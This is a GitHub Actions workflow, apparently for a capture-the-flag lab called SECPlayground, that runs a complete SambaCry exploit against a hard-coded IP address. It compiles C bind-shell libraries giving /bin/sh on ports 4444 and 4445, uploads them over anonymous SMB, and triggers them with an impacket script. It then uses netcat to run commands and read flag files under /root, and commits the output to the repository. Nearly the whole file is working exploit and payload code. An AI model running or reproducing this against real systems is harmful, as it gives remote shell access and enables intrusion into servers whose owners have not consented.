name: SECPlayground temporary runner

on:
  push:
    branches:
      - secplayground-runner-*
  workflow_dispatch:

permissions:
  contents: write

jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4

      - name: Prepare tools
        run: |
          set -euxo pipefail
          sudo apt-get update
          sudo apt-get install -y smbclient netcat-openbsd gcc python3-pip
          python3 -m pip install --user impacket

      - name: One-shot SambaCry exploit
        run: |
          set -uxo pipefail
          TARGET="34.21.201.155"
          OUT="secplayground-result.txt"
          : > "$OUT"
          exec > >(tee -a "$OUT") 2>&1
          date -u
          echo "Target: $TARGET"
          nc -vz -w 8 "$TARGET" 445 || true
          smbclient -L "//$TARGET/" -N -g || true

          cat > exploit.py <<'PY'
          from optparse import OptionParser
          from impacket.dcerpc.v5 import transport
          parser = OptionParser()
          parser.add_option("-t", "--target", dest="target")
          parser.add_option("-m", "--module", dest="module")
          options, _ = parser.parse_args()
          stringbinding = r'ncacn_np:%s[\pipe\%s]' % (options.target, options.module)
          dce = transport.DCERPCTransportFactory(stringbinding).get_dce_rpc()
          dce.connect()
          PY

          cat > bindshell-samba.c <<'C'
          #include <stdlib.h>
          #include <netinet/in.h>
          #include <sys/types.h>
          #include <sys/socket.h>
          #include <sys/stat.h>
          #include <unistd.h>
          #ifndef BIND_PORT
          #define BIND_PORT 4444
          #endif
          static void detach(void) {
            pid_t pid;
            if (getppid() == 1) return;
            pid = fork();
            if (pid < 0) exit(1);
            if (pid > 0) exit(0);
            umask(0);
            setsid();
            chdir("/");
          }
          int samba_init_module(void) {
            detach();
            int s, c;
            struct sockaddr_in a;
            char *argv[] = {"/bin/sh", "-i", NULL};
            s = socket(PF_INET, SOCK_STREAM, 0);
            a.sin_family = AF_INET;
            a.sin_port = htons(BIND_PORT);
            a.sin_addr.s_addr = htonl(INADDR_ANY);
            bind(s, (struct sockaddr*) &a, sizeof(a));
            listen(s, 2);
            c = accept(s, NULL, NULL);
            dup2(c, 0);
            dup2(c, 1);
            dup2(c, 2);
            execve("/bin/sh", argv, NULL);
            return 0;
          }
          C

          gcc -shared -fPIC -DBIND_PORT=4444 -o libspg4444.so bindshell-samba.c
          gcc -shared -fPIC -DBIND_PORT=4445 -o libspg4445.so bindshell-samba.c
          smbclient "//$TARGET/share" -N -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true

          for n in 1 2 3; do
            echo "Trigger round $n /tmp/libspg4444.so"
            python3 exploit.py -t "$TARGET" -m /tmp/libspg4444.so || true
            echo "Trigger round $n /tmp/libspg4445.so"
            python3 exploit.py -t "$TARGET" -m /tmp/libspg4445.so || true
            sleep 2
            for p in 4444 4445 6699; do
              echo "Connect bind shell $p"
              printf 'id\nhostname\nfind /root -maxdepth 2 -type f -iname "*flag*" -print -exec cat {} \\;\nexit\n' | nc -w 8 "$TARGET" "$p" || true
            done
          done

      - name: Commit result
        if: always()
        run: |
          set -euxo pipefail
          git config user.name "SECPlayground Runner"
          git config user.email "actions@users.noreply.github.com"
          git add secplayground-result.txt || true
          git commit -m "Add SECPlayground temporary result" || true
          git push origin HEAD
